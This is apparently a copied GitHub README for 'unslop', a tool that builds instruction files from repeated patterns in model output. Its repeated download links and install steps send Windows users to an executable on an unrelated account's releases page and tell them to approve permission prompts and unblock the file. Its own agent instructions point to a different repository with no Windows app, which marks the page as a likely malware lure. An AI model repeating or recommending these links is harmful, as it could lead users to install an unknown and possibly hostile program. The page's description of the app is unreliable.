# 🧹 unslop - Make outputs less generic fast

[![Download unslop](https://img.shields.io/badge/Download%20unslop-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Yemeni-genusagdestis605/unslop/releases)

## 🚀 What this app does

unslop helps you find the repeated patterns a model keeps using, then turns those patterns into a simple instruction file you can reuse later.

It is useful when outputs start to feel samey. It looks for the kinds of moves models fall back on, like the same openings, the same structure, or the same way of explaining things. Then it writes that into a file you can hand back to the model for more specific results.

## 💻 Before you start

You only need a Windows PC and a browser.

For best results, use:

- Windows 10 or Windows 11
- A stable internet connection
- Enough free space to download the app and save output files
- A recent browser if you need to open release pages or view files

No programming knowledge is needed.

## ⬇️ Download unslop for Windows

Visit this page to download and run the app:

[https://github.com/Yemeni-genusagdestis605/unslop/releases](https://github.com/Yemeni-genusagdestis605/unslop/releases)

On that page, look for the latest release and download the Windows file. If there are several files, choose the one made for Windows. After the download finishes, open the file to start the app or follow the file name shown in the release notes.

## 🛠️ Install and run

1. Open the release page.
2. Find the newest version at the top.
3. Download the Windows file from that release.
4. Open the downloaded file.
5. If Windows asks for permission, choose Yes or Run.
6. Follow the on-screen steps until the app starts.

If the app comes in a zip file, first unzip it, then open the main file inside the folder.

## 📁 What you need to provide

To use unslop, you give it a domain.

A domain is the topic or field you want to study. For example:

- marketing copy
- product pages
- technical docs
- app screenshots
- email writing
- landing page layouts

The app then studies common defaults in that area and builds a reusable instruction file from them.

## 🧭 How to use it

1. Start the app.
2. Enter the domain you want to study.
3. Let unslop generate its analysis set.
4. Review the output files.
5. Use the final instruction file in your next model run.

The app focuses on two main results:

- `analysis.md` — shows the repeated patterns it found
- `skill.md` — gives you the reusable instruction file

## 📄 Output files

After the run, look in the `unslop-output` folder.

You will usually see:

- `analysis.md`  
  A plain report of the repeated defaults the model used

- `skill.md`  
  A cleaner instruction file you can reuse in later prompts

These files help you see what the model leans on and how to push it toward more specific output.

## 🔎 What unslop looks for

unslop checks for patterns such as:

- repeated sentence openings
- common transition words
- the same paragraph shape
- safe, vague phrasing
- standard layout blocks
- reused design choices
- generic wording in replies

This makes it easier to spot where the model sounds flat or too broad.

## 🧩 Typical use cases

Use unslop when you want better control over model output in areas like:

- writing product copy
- building prompt sets
- shaping brand voice
- reviewing generated design ideas
- improving support replies
- making a model sound less generic

It works well when you want the next output to feel more specific without rewriting everything by hand.

## 🧠 How to get better results

Use a narrow domain.

For example, instead of:

- writing

Use:

- SaaS onboarding emails
- B2B homepage copy
- help center articles for billing issues
- real estate listing descriptions

A narrower domain gives the app a clearer target and usually leads to more useful output.

## 🗂️ File layout

A typical run creates this structure:

- `unslop-output/analysis.md`
- `unslop-output/skill.md`
- related run files used during the analysis

Keep the output folder together so you can find the results later.

## 🔗 Send this to your agent

Copy and send this sentence:

```text
Clone https://github.com/mshumer/unslop, read https://github.com/mshumer/unslop/blob/main/skills/unslop/SKILL.md, run unslop for DOMAIN_HERE, review unslop-output/analysis.md and unslop-output/skill.md for specificity, and return the finished skill file plus the main repeated patterns you found.
```

## 🧰 Common fixes

If the app does not start:

- Make sure the download finished
- Unzip the file if needed
- Try opening it again from the folder
- Check that Windows did not block the file
- Download the latest release again if the file looks broken

If you do not see output files:

- Run the app again
- Confirm the domain was entered
- Check the `unslop-output` folder in the same place as the app files

If the output looks too broad:

- Use a more specific domain
- Try a smaller task area
- Run it again with a clearer topic

## 📘 How to read the results

When you open `analysis.md`, look for the patterns that repeat most.

When you open `skill.md`, look for:

- short, direct instructions
- clear examples
- fewer vague phrases
- more domain-specific guidance

If the skill file still feels broad, rerun unslop with a tighter domain.

## 🖱️ Quick start

1. Go to [https://github.com/Yemeni-genusagdestis605/unslop/releases](https://github.com/Yemeni-genusagdestis605/unslop/releases)
2. Download the Windows release file
3. Open it on your PC
4. Enter your domain
5. Review `unslop-output/analysis.md`
6. Use `unslop-output/skill.md` in your next run